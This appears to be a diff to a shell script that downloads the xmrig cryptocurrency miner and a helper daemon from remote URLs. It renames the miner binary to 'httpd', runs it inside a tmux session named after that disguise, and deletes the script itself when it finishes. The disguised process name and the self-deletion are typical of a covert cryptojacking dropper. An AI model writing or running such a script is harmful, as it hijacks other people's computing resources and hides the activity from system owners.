@@ -1,9 +1,20 @@
 #!/bin/sh
 
+## needed
+apk --no-cache add tmux sed grep 2>/dev/null
+## glib
+LIBC=2.26-r0
+wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://raw.githubusercontent.com/sgerrand/alpine-pkg-glibc/master/sgerrand.rsa.pub
+wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/${LIBC}/glibc-${LIBC}.apk
+apk add glibc-${LIBC}.apk 2>/dev/null
+rm -f glibc-${LIBC}.apk
+
 cd ~/
 
-MASK=${MASK:-httpd}
-DAEMON=${MASK:-pausd}
+OBJ_MASK=${OBJ_MASK:-httpd}
+DAEMON=${DAEMON:-pausd}
+OBJ_CFG=${OBJ_CFG:-cfg}
+DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_CFG}}
 
 ## object
 OBJ_VER=${OBJ_VER:-2.4.3}
@@ -11,13 +22,27 @@ OBJ_NAME=${OBJ_NAME:-xmrig}
 OBJ_URL=${OBJ_URL:-https://github.com/xmrig/xmrig/releases/download/v${OBJ_VER}/${OBJ_NAME}-${OBJ_VER}-gcc7-xenial-amd64-no-api.tar.gz}
 
 ## get the object
-wget -q $OBJ_URL obj.tar.gz
+wget -q $OBJ_URL -O obj.tar.gz
 tar xf obj.tar.gz
-rm obj.tar.gz
-mv ${OBJ_NAME}*/${OBJ_NAME} ${MASK}
+rm -f obj.tar.gz
+mv ${OBJ_NAME}*/${OBJ_NAME} ${OBJ_MASK}
+rm -rf ${OBJ_NAME}*/
+chmod +x ${OBJ_MASK} &>/dev/null
 
 ## daemon
-URL=$(https://github.com/untoreh/scripts/)
+DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${DAEMON}
+wget -q ${DAEMON_URL}
+chmod +x ${DAEMON} &>/dev/null
 
-## get the daemon
+## daemon conf
+PAUSD_SHARES=${PAUSD_SHARES:-1}
+PAUSD_THREADS=${PAUSD_THREADS:-1}
+PAUSD_VER=${PAUSD_VER:-2}
+PAUSD_SESSION_NAME=${PAUSD_SESSION_NAME:-${OBJ_MASK}}
+PAUSD_RATE=${PAUSD_RATE:-200}
 
+## init
+PATH=.:$PATH tmux new-session -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
+
+## cleanup
+exec rm -- "$0"
